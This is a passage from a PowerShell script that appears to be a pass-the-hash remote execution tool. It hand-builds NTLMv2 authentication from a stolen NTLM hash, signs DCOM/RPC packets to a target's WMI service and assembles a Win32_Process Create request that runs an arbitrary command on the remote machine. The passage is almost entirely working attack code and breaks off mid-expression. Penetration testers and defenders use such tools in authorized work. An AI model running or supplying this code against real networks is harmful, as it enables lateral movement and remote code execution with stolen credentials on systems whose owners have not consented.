            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain = $Domain
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $WMI_target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $WMI_target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $WMI_NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)
            $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)

            $client_signing_constant = 0x73,0x65,0x73,0x73,0x69,0x6f,0x6e,0x20,0x6b,0x65,0x79,0x20,0x74,0x6f,0x20,
                                        0x63,0x6c,0x69,0x65,0x6e,0x74,0x2d,0x74,0x6f,0x2d,0x73,0x65,0x72,0x76,
                                        0x65,0x72,0x20,0x73,0x69,0x67,0x6e,0x69,0x6e,0x67,0x20,0x6b,0x65,0x79,
                                        0x20,0x6d,0x61,0x67,0x69,0x63,0x20,0x63,0x6f,0x6e,0x73,0x74,0x61,0x6e,
                                        0x74,0x00

            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $client_signing_key = $MD5.ComputeHash($session_base_key + $client_signing_constant)
            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
            $WMI_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)
            $WMI_session_key_length = 0x00,0x00
            $WMI_negotiate_flags = 0x15,0x82,0x88,0xa2

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $WMI_session_key_length +
                                    $WMI_session_key_length +
                                    $WMI_session_key_offset +
                                    $WMI_negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            $HMAC_MD5.key = $client_signing_key
            [Byte[]]$sequence_number = 0x00,0x00,0x00,0x00
            $packet_RPC = New-PacketRPCAUTH3 $NTLMSSP_response
            $packet_RPC["CallID"] = 0x02,0x00,0x00,0x00
            $packet_RPC["AuthLevel"] = 0x04
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $WMI_client_send = $RPC
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()
            $packet_RPC = New-PacketRPCRequest 0x83 76 16 4 0x02,0x00,0x00,0x00 0x00,0x00 0x03,0x00 $object_UUID
            $packet_rem_query_interface = New-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
            $packet_NTLMSSP_verifier = New-PacketNTLMSSPVerifier 4 0x04 $sequence_number
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $rem_query_interface = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
            $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
            $HMAC_MD5.key = $client_signing_key
            $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $rem_query_interface + $NTLMSSP_verifier[0..11])
            $RPC_signature = $RPC_signature[0..7]
            $packet_NTLMSSP_verifier["NTLMSSPVerifierChecksum"] = $RPC_signature
            $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
            $WMI_client_send = $RPC + $rem_query_interface + $NTLMSSP_verifier
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()    
            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
            $WMI_client_stage = 'Exit'

            if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
            {
                Write-Output "[-] $output_username WMI access denied on $target_long"   
            }
            elseif($WMI_client_receive[2] -eq 3)
            {
                $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
                $error_code = $error_code -replace "-",""
                Write-Output "[-] Failed with error code 0x$error_code"
            }
            elseif($WMI_client_receive[2] -eq 2)
            {
                $WMI_data = [System.BitConverter]::ToString($WMI_client_receive)
                $WMI_data = $WMI_data -replace "-",""
                $OXID_index = $WMI_data.IndexOf($OXID)
                $OXID_bytes_index = $OXID_index / 2
                $object_UUID2 = $WMI_client_receive[($OXID_bytes_index + 16)..($OXID_bytes_index + 31)]
                $WMI_client_stage = 'AlterContext'
            }
            else
            {
                Write-Output "[-] Something went wrong"
            }

            Write-Verbose "[*] Attempting command execution"
            $request_split_index = 5500

            :WMI_execute_loop while ($WMI_client_stage -ne 'Exit')
            {

                if($WMI_client_receive[2] -eq 3)
                {
                    $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
                    $error_code = $error_code -replace "-",""
                    Write-Output "[-] Failed with error code 0x$error_code"
                    $WMI_client_stage = 'Exit'
                }

                switch ($WMI_client_stage)
                {
            
                    'AlterContext'
                    {

                        switch ($sequence_number[0])
                        {

                            0
                            {
                                $alter_context_call_ID = 0x03,0x00,0x00,0x00
                                $alter_context_context_ID = 0x02,0x00
                                $alter_context_UUID = 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
                                $WMI_client_stage_next = 'Request'
                            }

                            1
                            {
                                $alter_context_call_ID = 0x04,0x00,0x00,0x00 
                                $alter_context_context_ID = 0x03,0x00
                                $alter_context_UUID = 0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20
                                $WMI_client_stage_next = 'Request'
                            }

                            6
                            {
                                $alter_context_call_ID = 0x09,0x00,0x00,0x00 
                                $alter_context_context_ID = 0x04,0x00
                                $alter_context_UUID = 0x99,0xdc,0x56,0x95,0x8c,0x82,0xcf,0x11,0xa3,0x7e,0x00,0xaa,0x00,0x32,0x40,0xc7
                                $WMI_client_stage_next = 'Request'
                            }

                        }

                        $packet_RPC = New-PacketRPCAlterContext $assoc_group $alter_context_call_ID $alter_context_context_ID $alter_context_UUID
                        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                        $WMI_client_send = $RPC
                        $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
                        $WMI_client_random_port_stream.Flush()    
                        $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                        $WMI_client_stage = $WMI_client_stage_next
                    }
                  
                    'Request'
                    {
                        $request_split = $false

                        switch ($sequence_number[0])
                        {

                            0
                            {
                                $sequence_number = 0x01,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 12
                                $request_call_ID = 0x03,0x00,0x00,0x00
                                $request_context_ID = 0x02,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID2
                                $hostname_length = [System.BitConverter]::GetBytes($auth_hostname.Length + 1)
                                $WMI_client_stage_next = 'AlterContext'

                                if([Bool]($auth_hostname.Length % 2))
                                {
                                    $auth_hostname_bytes += 0x00,0x00
                                }
                                else
                                {
                                    $auth_hostname_bytes += 0x00,0x00,0x00,0x00
                                }

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                                                $causality_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 + 
                                                $hostname_length +
                                                0x00,0x00,0x00,0x00 +
                                                $hostname_length +
                                                $auth_hostname_bytes +
                                                $process_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x00

                            }

                            1
                            {
                                $sequence_number = 0x02,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 8
                                $request_call_ID = 0x04,0x00,0x00,0x00
                                $request_context_ID = 0x03,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $IPID
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                                                $causality_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

                            }

                            2
                            {
                                $sequence_number = 0x03,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x05,0x00,0x00,0x00
                                $request_context_ID = 0x03,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID
                                [Byte[]]$WMI_namespace_length = [System.BitConverter]::GetBytes($target_short.Length + 14)
                                [Byte[]]$WMI_namespace_unicode = [System.Text.Encoding]::Unicode.GetBytes("\\$target_short\root\cimv2")
                                $WMI_client_stage_next = 'Request'

                                if([Bool]($target_short.Length % 2))
                                {
                                    $WMI_namespace_unicode += 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    $WMI_namespace_unicode += 0x00,0x00
                                }

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                $WMI_namespace_length +
                                                0x00,0x00,0x00,0x00 +
                                                $WMI_namespace_length +
                                                $WMI_namespace_unicode +
                                                0x04,0x00,0x02,0x00,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x09,
                                                0x00,0x00,0x00,0x65,0x00,0x6e,0x00,0x2d,0x00,0x55,0x00,0x53,0x00,
                                                0x2c,0x00,0x65,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00

                            }

                            3
                            {
                                $sequence_number = 0x04,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 8
                                $request_call_ID = 0x06,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x05,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'Request'
                                $WMI_data = [System.BitConverter]::ToString($WMI_client_receive)
                                $WMI_data = $WMI_data -replace "-",""
                                $OXID_index = $WMI_data.IndexOf($OXID)
                                $OXID_bytes_index = $OXID_index / 2
                                $IPID2 = $WMI_client_receive[($OXID_bytes_index + 16)..($OXID_bytes_index + 31)]
                                $packet_rem_release = New-PacketDCOMRemRelease $causality_ID_bytes $object_UUID2 $IPID
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_release
                            }

                            4
                            {
                                $sequence_number = 0x05,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 4
                                $request_call_ID = 0x07,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'Request'
                                $packet_rem_query_interface = New-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x9e,0xc1,0xfc,0xc3,0x70,0xa9,0xd2,0x11,0x8b,0x5a,0x00,0xa0,0xc9,0xb7,0xc9,0xc4
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
                            }

                            5
                            {
                                $sequence_number = 0x06,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 4
                                $request_call_ID = 0x08,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'AlterContext'
                                $packet_rem_query_interface = New-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x83,0xb2,0x96,0xb1,0xb4,0xba,0x1a,0x10,0xb6,0x9c,0x00,0xaa,0x00,0x34,0x1d,0x07
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
                            }

                            6
                            {
                                $sequence_number = 0x07,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x09,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID2
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00

                            }

                            7
                            {
                                $sequence_number = 0x08,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x10,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID2
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00

                            }

                            {$_ -ge 8}
                            {
                                $sequence_number = 0x09,0x00,0x00,0x00
                                $request_auth_padding = 0
                                $request_call_ID = 0x0b,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x18,0x00
                                $request_UUID = $IPID2
                                [Byte[]]$stub_length = [System.BitConverter]::GetBytes($Command.Length + 1769)[0,1]
                                [Byte[]]$stub_length2 = [System.BitConverter]::GetBytes($Command.Length + 1727)[0,1]
                                [Byte[]]$stub_length3 = [System.BitConverter]::GetBytes($Command.Length + 1713)[0,1]
                                [Byte[]]$command_length = [System.BitConverter]::GetBytes($Command.Length + 93)[0,1]
                                [Byte[]]$command_length2 = [System.BitConverter]::GetBytes($Command.Length + 16)[0,1]
                                [Byte[]]$command_bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)


                                # thanks to @vysec for finding a bug with certain command lengths
                                [String]$command_padding_check = $Command.Length / 4
                                
                                if($command_padding_check -like "*.75")
                                {
                                    $command_bytes += 0x00
                                }
                                elseif($command_padding_check -like "*.5")
                                {
                                    $command_bytes += 0x00,0x00
                                }
                                elseif($command_padding_check -like "*.25")
                                {
                                    $command_bytes += 0x00,0x00,0x00
                                }
                                else
                                {
                                    $command_bytes += 0x00,0x00,0x00,0x00
                                }
                                
                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x55,0x73,0x65,0x72,
                                                0x06,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x63,
                                                0x00,0x72,0x00,0x65,0x00,0x61,0x00,0x74,0x00,0x65,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                $stub_length +
                                                0x00,0x00 +
                                                $stub_length +
                                                0x00,0x00,0x4d,0x45,0x4f,0x57,0x04,0x00,0x00,0x00,0x81,0xa6,0x12,
                                                0xdc,0x7f,0x73,0xcf,0x11,0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24,
                                                0x12,0xf8,0x90,0x45,0x3a,0x1d,0xd0,0x11,0x89,0x1f,0x00,0xaa,0x00,
                                                0x4b,0x2e,0x24,0x00,0x00,0x00,0x00 +
                                                $stub_length2 +
                                                0x00,0x00,0x78,0x56,0x34,0x12 +
                                                $stub_length3 +
                                                0x00,0x00,0x02,0x53,
                                                0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x04,
                                                0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x0e,0x00,0x00,0x00,0x00,0x0b,
                                                0x00,0x00,0x00,0xff,0xff,0x03,0x00,0x00,0x00,0x2a,0x00,0x00,0x00,
                                                0x15,0x01,0x00,0x00,0x73,0x01,0x00,0x00,0x76,0x02,0x00,0x00,0xd4,
                                                0x02,0x00,0x00,0xb1,0x03,0x00,0x00,0x15,0xff,0xff,0xff,0xff,0xff,
                                                0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x12,0x04,0x00,0x80,0x00,0x5f,
                                                0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,0x52,0x53,0x00,0x00,
                                                0x61,0x62,0x73,0x74,0x72,0x61,0x63,0x74,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,
                                                0x00,0x00,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,0x69,0x6e,0x65,
                                                0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,
                                                0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,
                                                0x00,0x00,0x49,0x6e,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x5e,0x00,0x00,
                                                0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0x94,
                                                0x00,0x00,0x00,0x00,0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,
                                                0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,
                                                0x68,0x72,0x65,0x61,0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,
                                                0x6e,0x73,0x7c,0x6c,0x70,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,
                                                0x69,0x6e,0x65,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,0x6e,0x67,
                                                0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,0x00,0x00,
                                                0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,
                                                0x5e,0x00,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0xca,0x00,
                                                0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x8c,0x00,0x00,0x00,0x00,0x49,
                                                0x44,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,
                                                0x00,0x00,0x00,0x59,0x01,0x00,0x00,0x5e,0x00,0x00,0x00,0x00,0x0b,
                                                0x00,0x00,0x00,0xff,0xff,0xca,0x00,0x00,0x00,0x02,0x08,0x20,0x00,
                                                0x00,0x8c,0x00,0x00,0x00,0x11,0x01,0x00,0x00,0x11,0x03,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,
                                                0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x04,0x00,0x00,0x00,0x00,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,
                                                0x44,0x69,0x72,0x65,0x63,0x74,0x6f,0x72,0x79,0x00,0x00,0x73,0x74,
                                                0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,0x00,0x00,0x00,0x49,0x6e,
                                                0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,
                                                0x00,0x00,0x85,0x01,0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,
                                                0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0xe2,0x01,0x00,0x00,0x00,
                                                0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,0x50,0x72,0x6f,0x63,
                                                0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,0x68,0x72,0x65,0x61,
                                                0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x73,0x7c,0x43,
                                                0x72,0x65,0x61,0x74,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x7c,
                                                0x6c,0x70,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,0x44,0x69,0x72,0x65,
                                                0x63,0x74,0x6f,0x72,0x79,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,
                                                0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,
                                                0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,
                                                0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x85,0x01,
                                                0x00,0x00,0xac,0x01,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,
                                                0x2b,0x02,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0xda,0x01,0x00,0x00,
                                                0x00,0x49,0x44,0x00,0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,
                                                0x03,0x08,0x00,0x00,0x00,0xba,0x02,0x00,0x00,0xac,0x01,0x00,0x00,
                                                0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x2b,0x02,0x00,0x00,0x02,0x08,
                                                0x20,0x00,0x00,0xda,0x01,0x00,0x00,0x72,0x02,0x00,0x00,0x11,0x03,
                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,
                                                0x67,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x50,0x72,0x6f,0x63,0x65,
                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x49,0x6e,0x66,0x6f,
                                                0x72,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x00,0x00,0x6f,0x62,0x6a,0x65,
                                                0x63,0x74,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,
                                                0x08,0x00,0x00,0x00,0xef,0x02,0x00,0x00,0x00,0x49,0x6e,0x00,0x0d,
                                                0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,
                                                0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,
                                                0xff,0xff,0x01,0x00,0x00,0x00,0x4c,0x03,0x00,0x00,0x00,0x57,0x4d,
                                                0x49,0x7c,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,0x6f,0x63,0x65,
                                                0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70,0x00,0x00,0x4d,0x61,
                                                0x70,0x70,0x69,0x6e,0x67,0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,
                                                0x0d,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x29,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,
                                                0x00,0xef,0x02,0x00,0x00,0x16,0x03,0x00,0x00,0x02,0x0b,0x00,0x00,
                                                0x00,0xff,0xff,0x66,0x03,0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x44,
                                                0x03,0x00,0x00,0x00,0x49,0x44,0x00,0x0d,0x00,0x00,0x00,0x02,0x00,
                                                0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,
                                                0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0xf5,0x03,0x00,0x00,0x16,
                                                0x03,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0xff,0xff,0x66,0x03,0x00,
                                                0x00,0x02,0x08,0x20,0x00,0x00,0x44,0x03,0x00,0x00,0xad,0x03,0x00,
                                                0x00,0x11,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x6f,0x62,
                                                0x6a,0x65,0x63,0x74,0x3a,0x57,0x69,0x6e,0x33,0x32,0x5f,0x50,0x72,
                                                0x6f,0x63,0x65,0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x75,0x70 +
                                                (,0x00 * 501) +
                                                $command_length +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x0e,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x01 +
                                                $command_length2 +
